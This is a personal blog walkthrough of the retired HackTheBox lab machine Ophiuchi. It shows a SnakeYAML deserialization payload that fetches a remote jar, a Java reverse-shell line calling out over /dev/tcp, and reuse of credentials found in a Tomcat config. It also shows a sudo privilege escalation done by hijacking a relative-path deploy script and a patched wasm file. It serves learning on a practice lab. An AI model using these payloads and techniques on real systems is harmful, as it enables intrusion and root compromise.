---
layout: walkthrough
title: HackTheBox - Ophiuchi
date: 2021-07-04 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/ophiuchi.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Ophiuchi --`10.10.10.227`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Ophiuchi/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Ophiutchi$ nmap -sC -sV 10.10.10.227
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-17 07:44 EDT
Nmap scan report for 10.10.10.227
Host is up (0.18s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE       VERSION
22/tcp   open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
5004/tcp filtered avt-profile-1
8080/tcp open     http          Apache Tomcat 9.0.38
|_http-title: Parse YAML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.31 seconds
```

</details>


From the output shown above, we can see that the machine is a Linux machine and I added `ophiuchi.htb` to the `/etc/hosts` file. As this is a Linux machine and it only has 3 open ports, I started by navigating to the web application. Browsing to the web application, I was presented with an online YAML parser:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Ophiuchi/img1.png"  style="width: 60%" />
</p>


I started off by doing some searches for YAML exploits and came across the following deserialization vulnerability: <https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858>.

> The vulnerabilities lies in the way the snakeyaml parses the yaml file. 
> So during a secure code review of java application if we encounter yaml.load function being used with user input directly being passed to the function, then the application can be vulnerable to deserilization vulnerability which can lead to remote code execution.

I started off by copying the basic exploit to ensure that this was the correct train of thought:

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.60/]
  ]]
]
```

Using the code block above, I ran the code and received a connection back to my host:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Ophiuchi/img2.png"  style="width: 80%" />
</p>

While the code was being exploited, the web application itself returned an error message stating: `Due to security reason this feature has been temporarily on hold. We will soon fix the issue!`. I continued reading the article and came across the following:

> The  snake YAML has a feature which supports for a special syntax that  allows the constructor of any Java class to be called when parsing YAML data which is (!!<java class constructor>). So,  according to this, upon parsing the payload, snake YAML will invoke the ScriptEngineManager constructor and make a request to http://attacker-ip/ which we just saw above.


Snake YAML, upon parsing our exploit payload, tries to access the endpoint `/META-INF/services/javax.script.ScriptEngineFactory` and since it's not available, the server responds with a 404 error. In order to exploit this, I needed to create the following structure:

* Create two folders, one is snakeyaml and other "META-INF". 
* Inside snakeyaml put the exploit.class file 
* Inside "META-INF" create another folder named "services" 
* Inside "services" create a "javax.script.ScriptEngineFactory" file with content "snakeyaml.exploit"


Now that I had the exploit steps in order, I needed to create the file structure and the initial Java code. I made use of the following Github PoC: <https://github.com/artsploit/yaml-payload>. Additionally, for the reverse shell, I used the following example from PayloadAllTheThings:

```java
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();
```

After editing the source file, I compiled the project using the following commands:

```bash
javac exploit.jar
jar -cvf exploit.jar -C exploit/ .
```

Finally, I went back to the web application and extended the path to pull my newly created jar file:

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.60/exploit.jar]
  ]]
]
```

After running the code, it retrieved the exploit code and I managed to obtain a reverse shell on the machine:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Ophiuchi/img3.png"  style="width: 80%" />
</p>

## Lateral Movement using Tomcat

Since it was the tomcat user, I started looking into configuration files that the user had access to and found the following credentials within the `tomcat-users.xsd` file:

```bash
<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
```
Using the credentials, I used the `su` command and attempted to log in to the `admin` user account:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Ophiuchi/img4.png"  style="width: 80%" />
</p>

## Privilege Escalation using Admin

Success! I now had access to the `admin` user's account. I started off by doing some simple enumeration and found that the user was able to run sudo on the following Golang file:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Ophiuchi/img5.png"  style="width: 80%" />
</p>

I started off by looking into the file, the contents are provided below:=

<details>

```go
package main

import (
        "fmt"
        wasm "github.com/wasmerio/wasmer-go/wasmer"
        "os/exec"
        "log"
)

func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {
                fmt.Println("Not ready to deploy")
        } else {
                fmt.Println("Ready to deploy")
                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}

```

</details>

To exploit this, I would need to run: `sudo /usr/bin/go run /opt/wasm-functions/index.go`. In order to exploit it, I first needed to determine what `wasmer` is:

> Wasmer enables super lightweight containers based on WebAssembly that can run anywhere: from Desktop to the Cloud and IoT devices, and also embedded in any programming language.

> WebAssembly (abbreviated Wasm) is a binary instruction format for astack-based virtual machine. Wasm is designed as a portable targetfor compilation of high-level languages like C/C++/Rust, enablingdeployment on the web for client and server applications.


Okay, since I knew that both `main.wasm` and `deploy.sh` didn't have absolute paths, I should be able to exploit them. I started by running a very simple exploit:

```bash
echo "/bin/bash">deploy.sh
```

However, after running the sudo command, I received the following error:

```bash
sudo /usr/bin/go run /opt/wasm-functions/index.go
Not ready to deploy
```

Going back to the code, I realised that if the value of `f` was not `1`, which is read from the wasm file, then it would not execute the deploy script. I copied the file to my local host and viewed the wasm file using wasm2wat which is the inverse of wat2wasm, which is used to translate the file from the binary format back to the text format (also known as a .wat).

After converting the file to text using the `wasm2wat main.wasm -o main.wat` command, the file contained the following:

```bash
(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 0)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export "memory" (memory 0))
  (export "info" (func $info))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2)))
```

If you recall from the `index.go` function, the code searched for ` init := instance.Exports["info"]` which in the file above was set to `0`. I changed the value to `1`, recompiled the code with wat2wasm and transferred it back to the host.

The final step was to run the `index.go` file with the modified `deploy.sh` script using the following command:

```
sudo /usr/bin/go run /opt/wasm-functions/index.go
```

I ran the command above and I was able to exploit the file to obtain `root`:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Ophiuchi/img6.png"  style="width: 80%" />
</p>

That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.